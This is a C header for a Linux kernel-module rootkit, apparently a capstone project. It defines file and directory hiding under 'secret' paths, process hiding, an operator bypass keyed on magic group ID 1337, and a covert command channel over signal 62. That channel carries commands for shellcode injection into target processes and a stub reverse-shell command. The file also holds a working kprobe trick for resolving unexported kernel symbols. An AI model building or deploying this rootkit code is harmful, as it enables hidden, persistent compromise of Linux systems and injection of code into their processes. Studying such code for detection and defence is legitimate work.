/*
 * rootkit.h — Shared definitions for the capstone LKM rootkit
 */

#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/types.h>
#include <linux/kprobes.h>
#include <linux/uidgid.h>
#include <linux/cred.h>

/* ─── File hiding ─────────────────────────────────────────────────────────── */

#define HIDDEN_FILENAME     "secret"
#define HIDDEN_FILENAME_LEN 6

/* ─── Hidden directories ──────────────────────────────────────────────────── */

#define HIDDEN_DIR_1        "/tmp/secret"
#define HIDDEN_DIR_2        "/dev/shm/secret"
#define MAX_PATH_LEN        256

/* ─── Process hiding / operator bypass ────────────────────────────────────── */

#define MAGIC_GID           1337

/* ─── Covert C2 ───────────────────────────────────────────────────────────── */

#define MAGIC_SIGNAL        62
/*
 * Staging path for inject shellcode. Lives inside a protected directory so
 * it is hidden from directory listings and inaccessible to non-operators.
 * mykill writes the shellcode binary here before firing CMD_INJECT; the
 * kernel reads it from workqueue context (can sleep) and unlinks it.
 */
#define C2_INJECT_STAGING   "/tmp/secret/rk_sc"

#define CMD_STATUS        0
#define CMD_TOGGLE_HIDE   1
#define CMD_TOGGLE_BLOCK  2
#define CMD_TOGGLE_MODULE 3
#define CMD_TOGGLE_PROC   4
#define CMD_ADD_GID       5     /* x2 = target PID */
#define CMD_INJECT        6     /* x2 = target PID */
#define CMD_REVSHELL      7     /* x2 = port, x3 = IP (not implemented) */

/* ─── Symbol resolution (kprobe trick) ────────────────────────────────────── */

/*
 * Resolve a kernel symbol address using the kprobe registration trick.
 * Works for unexported symbols — register_kprobe calls kallsyms internally.
 */
static inline unsigned long kprobe_lookup(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp) < 0)
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

/* ─── Subsystem interfaces ────────────────────────────────────────────────── */

int  file_hide_init(void);
void file_hide_exit(void);
int  file_hide_enable(void);
void file_hide_disable(void);
bool file_hide_is_active(void);

int  proc_hide_init(void);
void proc_hide_exit(void);
int  proc_hide_enable(void);
void proc_hide_disable(void);
bool proc_hide_is_active(void);
int  proc_hide_add_pid(pid_t pid);

int  c2_init(void);
void c2_exit(void);

int  inject_init(void);
void inject_exit(void);
int  inject_trigger(pid_t target);

/* ─── Operator bypass (check for magic gid shared helper) ──────────────────── */

static inline bool caller_has_magic_gid(void)
{
    const struct cred *cred = current_cred();
    struct group_info *gi;
    int i;
    if (!cred)
        return false;
    gi = cred->group_info;
    if (!gi)
        return false;
    for (i = 0; i < gi->ngroups; i++) {
        if (from_kgid(&init_user_ns, gi->gid[i]) == MAGIC_GID)
            return true;
    }
    return false;
}

#endif /* ROOTKIT_H*/
